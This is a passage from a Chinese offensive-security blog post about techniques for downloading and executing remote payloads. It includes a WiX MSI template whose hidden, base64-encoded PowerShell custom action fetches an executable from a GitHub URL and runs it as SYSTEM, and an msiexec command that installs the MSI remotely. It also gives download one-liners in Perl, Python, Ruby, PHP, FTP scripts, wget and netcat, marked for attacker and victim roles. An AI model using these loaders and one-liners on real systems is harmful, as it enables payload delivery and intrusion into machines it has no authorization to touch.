+  <span class="nt">&lt;Product</span> <span class="na">Id=</span><span class="s">&#34;*&#34;</span> <span class="na">UpgradeCode=</span><span class="s">&#34;12345678-1234-1234-1234-111111111111&#34;</span> <span class="na">Name=</span><span class="s">&#34;Example Product
+</span><span class="s">Name&#34;</span> <span class="na">Version=</span><span class="s">&#34;0.0.1&#34;</span> <span class="na">Manufacturer=</span><span class="s">&#34;@_xpn_&#34;</span> <span class="na">Language=</span><span class="s">&#34;1033&#34;</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;Package</span> <span class="na">InstallerVersion=</span><span class="s">&#34;200&#34;</span> <span class="na">Compressed=</span><span class="s">&#34;yes&#34;</span> <span class="na">Comments=</span><span class="s">&#34;Windows Installer Package&#34;</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;Media</span> <span class="na">Id=</span><span class="s">&#34;1&#34;</span> <span class="nt">/&gt;</span>
+
+    <span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">&#34;TARGETDIR&#34;</span> <span class="na">Name=</span><span class="s">&#34;SourceDir&#34;</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">&#34;ProgramFilesFolder&#34;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">&#34;INSTALLLOCATION&#34;</span> <span class="na">Name=</span><span class="s">&#34;Example&#34;</span><span class="nt">&gt;</span>
+          <span class="nt">&lt;Component</span> <span class="na">Id=</span><span class="s">&#34;ApplicationFiles&#34;</span> <span class="na">Guid=</span><span class="s">&#34;12345678-1234-1234-1234-222222222222&#34;</span><span class="nt">&gt;</span>
+          <span class="nt">&lt;/Component&gt;</span>
+        <span class="nt">&lt;/Directory&gt;</span>
+      <span class="nt">&lt;/Directory&gt;</span>
+    <span class="nt">&lt;/Directory&gt;</span>
+
+    <span class="nt">&lt;Feature</span> <span class="na">Id=</span><span class="s">&#34;DefaultFeature&#34;</span> <span class="na">Level=</span><span class="s">&#34;1&#34;</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;ComponentRef</span> <span class="na">Id=</span><span class="s">&#34;ApplicationFiles&#34;</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;/Feature&gt;</span>
+
+    <span class="nt">&lt;Property</span> <span class="na">Id=</span><span class="s">&#34;cmdline&#34;</span><span class="nt">&gt;</span>powershell -WindowStyle Hidden -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAzAGcAcwB0AHUAZABlAG4AdAAvAHQAZQBzAHQALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AcAB1AHQAdAB5AC4AZQB4AGUAJwAsACcAYwA6AFwAZABvAHcAbgBsAG8AYQBkAFwAYQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAGMAOgBcAGQAbwB3AG4AbABvAGEAZABcAGEALgBlAHgAZQAnAA==
+    <span class="nt">&lt;/Property&gt;</span>
+
+    <span class="nt">&lt;CustomAction</span> <span class="na">Id=</span><span class="s">&#34;SystemShell&#34;</span> <span class="na">Execute=</span><span class="s">&#34;deferred&#34;</span> <span class="na">Directory=</span><span class="s">&#34;TARGETDIR&#34;</span>
+<span class="na">ExeCommand=</span><span class="s">&#39;[cmdline]&#39;</span> <span class="na">Return=</span><span class="s">&#34;ignore&#34;</span> <span class="na">Impersonate=</span><span class="s">&#34;no&#34;</span><span class="nt">/&gt;</span>
+
+    <span class="nt">&lt;CustomAction</span> <span class="na">Id=</span><span class="s">&#34;FailInstall&#34;</span> <span class="na">Execute=</span><span class="s">&#34;deferred&#34;</span> <span class="na">Script=</span><span class="s">&#34;vbscript&#34;</span> <span class="na">Return=</span><span class="s">&#34;check&#34;</span><span class="nt">&gt;</span>
+      invalid vbs to fail install
+    <span class="nt">&lt;/CustomAction&gt;</span>
+
+    <span class="nt">&lt;InstallExecuteSequence&gt;</span>
+      <span class="nt">&lt;Custom</span> <span class="na">Action=</span><span class="s">&#34;SystemShell&#34;</span> <span class="na">After=</span><span class="s">&#34;InstallInitialize&#34;</span><span class="nt">&gt;&lt;/Custom&gt;</span>
+      <span class="nt">&lt;Custom</span> <span class="na">Action=</span><span class="s">&#34;FailInstall&#34;</span> <span class="na">Before=</span><span class="s">&#34;InstallFiles&#34;</span><span class="nt">&gt;&lt;/Custom&gt;</span>
+    <span class="nt">&lt;/InstallExecuteSequence&gt;</span>
+
+  <span class="nt">&lt;/Product&gt;</span>
+<span class="nt">&lt;/Wix&gt;</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>将其编译，生成test.msi文件，命令如下：</p>
+
+<p><code>candle.exe msigen.wix</code><br />
+<code>light.exe msigen.wixobj</code></p>
+
+<p>实现功能：</p>
+
+<p><code>msiexec /q /i https://github.com/3gstudent/test/raw/master/test.msi</code><br />
+注：执行后需要手动结束进程msiexec.exe</p>
+
+<h1 id="0x14-linux-部分较特殊">0x14 Linux.部分较特殊</h1>
+
+<p><strong>Perl</strong><br />
+Perl是一种非常通用的脚本语言，几乎可以用于任何事情<br />
+<code>perl use LWP::Simple; getstore(&quot;http://domain/file&quot;, &quot;file&quot;);</code></p>
+
+<p><strong>Python</strong><br />
+Python是一种强调代码可读性的通用脚本语言。与大多数脚本语言一样，目标是编写比编程语言所需的代码更少的代码，同时仍然完成预期的任务。<br />
+<code>python import urllib2 u = urllib2.urlopen('http://domain/file') localFile = open('local_file', 'w') localFile.write(u.read()) localFile.close()</code></p>
+
+<p><strong>Ruby</strong><br />
+Ruby是一种面向对象的编程语言，可以用于创建框架（比如Metasploit）到诸如下载文件之类的简单任务。<br />
+<code>ruby require 'net/http' Net::HTTP.start(&quot;www.domain.com&quot;) { |http| r = http.get(&quot;/file&quot;) open(&quot;save_location&quot;, &quot;wb&quot;) { |file| file.write(r.body) } }</code></p>
+
+<p><strong>PHP</strong><br />
+PHP通常是用于Web开发的服务器端脚本语言，但也可以用作通用脚本语言。<br />
+<code>php &lt;?php $data=@file(&quot;http://example.com/file&quot;); $lf = &quot;local_file&quot;; $fh=fopen($lf,'w');fwrite($fh, $data[0]); fclose($fh); ?&gt;</code></p>
+
+<p>**FTP **<br />
+攻击者需要将FTP命令回显到bash脚本，因为它通常需要用户交互来输入用户名和密码<br />
+<code>ftp 127.0.0.1 username password get file exit</code></p>
+
+<p>贴一个三好学生的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">echo open 192.168.174.151 21&gt; ftp.txt
+echo ftp&gt;&gt; ftp.txt
+echo bin &gt;&gt; ftp.txt
+echo ftp&gt;&gt; ftp.txt
+echo GET ssss2.exe &gt;&gt; ftp.txt
+ftp -s:ftp.txt</pre></td></tr></table>
+</div>
+</div>
+<p><strong>Wget</strong><br />
+Wget是一个Linux和Windows工具，允许非交互式下载。<br />
+<code>wget http://example.com/file -o   /tmp/file</code></p>
+
+<p><strong>Netcat</strong><br />
+Netcat可以通过连接到一个特定的侦听端口来允许下载文件，该端口将通过连接传递文件的内容。<br />
+攻击者<code>cat file | nc -l 1234</code><br />
+被攻击者<code>nc host_ip 1234 &gt; file</code></p>
+
+<h1 id="0x15-相关链接">0x15 相关链接</h1>
+
+<p><a href="https://xianzhi.aliyun.com/forum/topic/1649/">https://xianzhi.aliyun.com/forum/topic/1649/</a></p>
+
+<p><a href="https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/">https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/</a></p>
+
+<p><a href="http://www.jianshu.com/p/9df5e6e62246">http://www.jianshu.com/p/9df5e6e62246</a></p>
+
+<p><a href="https://blog.netspi.com/15-ways-to-download-a-file/">https://blog.netspi.com/15-ways-to-download-a-file/</a></p>
+
+<p><a href="https://github.com/redcanaryco/atomic-red-team">https://github.com/redcanaryco/atomic-red-team</a></p>
+
+<p><a href="https://gist.github.com/Arno0x">https://gist.github.com/Arno0x</a></p>
+
+<p><a href="https://github.com/GreatSCT/GreatSCT">https://github.com/GreatSCT/GreatSCT</a></p>
+
+    </div>
+
+    
+<footer class="post-footer">
+      
+      <nav class="post-nav">
+        <a class="prev" href="/post/powershell-evasion/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">[译] Powershell-Evasion</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        <a class="next" href="/post/%E8%AF%91-15-way-bypass-powershell-exec/">
+            <span class="next-text nav-default">[译] 15-ways-bypass-powershell-exec</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.ae3e3272.min.js"></script>
+  <script type="text/javascript">
+    window.MathJax = {
+      tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+      showProcessingMessages: false,
+      messageStyle: 'none'
+    };
+  </script>
+  <script async src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"  integrity="sha256-nvJJv9wWKEm88qvoQl9ekL2J+k/RWIsaSScxxlsrv8k=" crossorigin="anonymous"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-153178075-1', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
